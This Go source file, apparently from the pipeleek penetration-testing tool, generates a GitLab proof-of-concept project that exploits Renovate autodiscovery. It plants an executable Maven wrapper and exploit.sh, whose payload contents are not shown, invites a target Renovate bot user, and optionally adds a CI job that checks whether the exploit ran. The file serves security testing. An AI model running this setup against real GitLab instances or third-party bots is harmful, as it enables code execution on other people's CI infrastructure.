package renovate

import (
	"github.com/CompassSecurity/pipeleek/pkg/format"
	"github.com/CompassSecurity/pipeleek/pkg/gitlab/util"
	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
	"github.com/rs/zerolog/log"
	gogitlab "gitlab.com/gitlab-org/api/client-go"
)

var gitlabCiYml = `
# GitLab CI/CD pipeline that runs Renovate Bot for debugging
# This verifies the exploit actually executes during Maven wrapper update
#
# Setup instructions:
# 1. Go to Project Settings > Access Tokens
# 2. Create a new project access token with 'api' scope and 'Maintainer' role (required for autodiscover)
# 3. Go to Project Settings > CI/CD > Variables
# 4. Add a new variable: Key = RENOVATE_TOKEN, Value = <your-token>
# 5. Run the pipeline and check the job output for exploit execution proof

renovate-debugging:
  image: renovate/renovate:latest
  script:
    - renovate --platform gitlab --autodiscover=true --token=$RENOVATE_TOKEN
    - echo "=== Checking if exploit executed ==="
    - |
      if [ -f /tmp/pipeleek-exploit-executed.txt ]; then
        echo "SUCCESS: Exploit was executed!"
        echo "=== Exploit proof file contents ==="
        cat /tmp/pipeleek-exploit-executed.txt
        cp /tmp/pipeleek-exploit-executed.txt exploit-proof.txt
      else
        echo "FAILED: /tmp/pipeleek-exploit-executed.txt not found"
        echo "Checking /tmp for any proof files..."
        ls -la /tmp/pipeleek-* 2>/dev/null || echo "No proof files found in /tmp"
      fi
  only:
    - main
  variables:
    LOG_LEVEL: debug
  artifacts:
    paths:
      - exploit-proof.txt
    when: always
    expire_in: 1 day
`

func RunGenerate(gitlabUrl, gitlabApiToken, repoName, username string, addRenovateCICD bool) {
	git, err := util.GetGitlabClient(gitlabApiToken, gitlabUrl)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	if repoName == "" {
		repoName = format.RandomStringN(5) + "-pipeleek-renovate-autodiscovery-poc"
	}

	opts := &gogitlab.CreateProjectOptions{
		Name:        gogitlab.Ptr(repoName),
		JobsEnabled: gogitlab.Ptr(true),
	}

	project, _, err := git.Projects.CreateProject(opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating project")
	}
	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")

	// Create files using shared constants
	createFile("renovate.json", pkgrenovate.RenovateJSON, git, int(project.ID), false)
	createFile("pom.xml", pkgrenovate.PomXML, git, int(project.ID), false)
	createFile("mvnw", pkgrenovate.MvnwScript, git, int(project.ID), true)
	createFile(".mvn/wrapper/maven-wrapper.properties", pkgrenovate.MavenWrapperProperties, git, int(project.ID), false)
	createFile("exploit.sh", pkgrenovate.ExploitScript, git, int(project.ID), true)

	if addRenovateCICD {
		createFile(".gitlab-ci.yml", gitlabCiYml, git, int(project.ID), false)
		log.Info().Msg("Created .gitlab-ci.yml for local Renovate testing")
		log.Warn().Msg("IMPORTANT: Add a CI/CD variable named RENOVATE_TOKEN with a project access token that has 'api' scope and at least maintainer permissions")
		log.Info().Msg("Then run the pipeline again, check the job output for 'SUCCESS: Exploit was executed!'")
		log.Info().Msg("If you want to retest, you need to DELETE the merge request and remove the branch that was created. Do not merge the update!")
	}

	if username == "" {
		log.Warn().Msg("No username provided, you must invite the victim Renovate Bot user manually to the created project")
	} else {
		invite(git, project, username)
	}

	log.Info().Msg(pkgrenovate.ExploitExplanation)
}

func invite(git *gogitlab.Client, project *gogitlab.Project, username string) {
	log.Info().Str("user", username).Msg("Inviting user to project")

	_, _, err := git.ProjectMembers.AddProjectMember(project.ID, &gogitlab.AddProjectMemberOptions{
		Username:    gogitlab.Ptr(username),
		AccessLevel: gogitlab.Ptr(gogitlab.DeveloperPermissions),
	})

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed inviting user to project, do it manually")
	}
}

func createFile(fileName string, content string, git *gogitlab.Client, projectId int, executable bool) {
	fileOpts := &gogitlab.CreateFileOptions{
		Branch:          gogitlab.Ptr("main"),
		Content:         gogitlab.Ptr(content),
		CommitMessage:   gogitlab.Ptr("Pipeleek create " + fileName),
		ExecuteFilemode: gogitlab.Ptr(executable),
	}
	fileInfo, _, err := git.RepositoryFiles.CreateFile(projectId, fileName, fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Str("fileName", fileName).Msg("Creating file failed")
	}

	log.Debug().Str("file", fileInfo.FilePath).Msg("Created file")
}
